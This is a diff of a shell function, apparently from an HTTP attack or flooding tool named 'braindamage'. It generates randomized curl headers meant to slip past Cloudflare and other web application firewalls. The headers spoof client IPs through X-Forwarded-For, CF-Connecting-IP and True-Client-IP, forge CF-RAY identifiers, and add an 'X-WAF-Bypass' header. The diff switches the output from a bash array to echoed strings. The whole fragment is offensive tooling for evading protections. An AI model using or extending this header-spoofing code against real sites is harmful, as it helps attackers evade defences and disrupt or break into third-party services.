@@ -52,20 +52,17 @@ braindamage() {
   local cf_ray
   cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
 
-  waf_trick=()
-  
   if [ "${REQ_METHOD:-POST}" = "GET" ]; then
     case "$choice" in
-      0) waf_trick=(-H "Content-Type:application/json" -H "X-Forwarded-For:127.0.0.1" -H "CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))" -H "CF-RAY:${cf_ray}-CGK") ;;
-      1) waf_trick=(-H "Content-Type:application/json" -H "CF-Visitor:{\"scheme\":\"https\"}") ;;
-      2) waf_trick=(-H "Content-Type:application/json" -H "X-WAF-Bypass:True" -H "CF-IPCountry:US" -H "True-Client-IP:103.21.244.$((RANDOM % 254 + 1))") ;;
+      0) echo "-H \"Content-Type:application/json\" -H \"X-Forwarded-For:127.0.0.1\" -H \"CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))\" -H \"CF-RAY:${cf_ray}-CGK\"" ;;
+      1) echo "-H \"Content-Type:application/json\" -H \"CF-Visitor:{\\\"scheme\\\":\\\"https\\\"}\"" ;;
+      2) echo "-H \"Content-Type:application/json\" -H \"X-WAF-Bypass:True\" -H \"CF-IPCountry:US\" -H \"True-Client-IP:103.21.244.$((RANDOM % 254 + 1))\"" ;;
     esac
   else
-    
     case "$choice" in
-      0) waf_trick=(-H "Content-Type:application/json" -H "Authorization:Bearer $cf_ray" -H "X-WAF-Bypass:True" -H "CF-IPCountry:US") ;;
-      1) waf_trick=(-H "Content-Type:application/json" -H "X-Requested-With:XMLHttpRequest" -H "CF-RAY:${cf_ray}-CGK" -H "True-Client-IP:103.21.244.$((RANDOM % 254 + 1))") ;;
-      2) waf_trick=(-H "Content-Type:application/json" -H "Cache-Control:no-cache,no-store" -H "Pragma:no-cache" -H "X-Forwarded-For:127.0.0.1") ;;
+      0) echo "-H \"Content-Type:application/json\" -H \"Authorization:Bearer $cf_ray\" -H \"X-WAF-Bypass:True\" -H \"CF-IPCountry:US\"" ;;
+      1) echo "-H \"Content-Type:application/json\" -H \"X-Requested-With:XMLHttpRequest\" -H \"CF-RAY:${cf_ray}-CGK\" -H \"True-Client-IP:103.21.244.$((RANDOM % 254 + 1))\"" ;;
+      2) echo "-H \"Content-Type:application/json\" -H \"Cache-Control:no-cache,no-store\" -H \"Pragma:no-cache\" -H \"X-Forwarded-For:127.0.0.1\"" ;;
     esac
   fi
 }
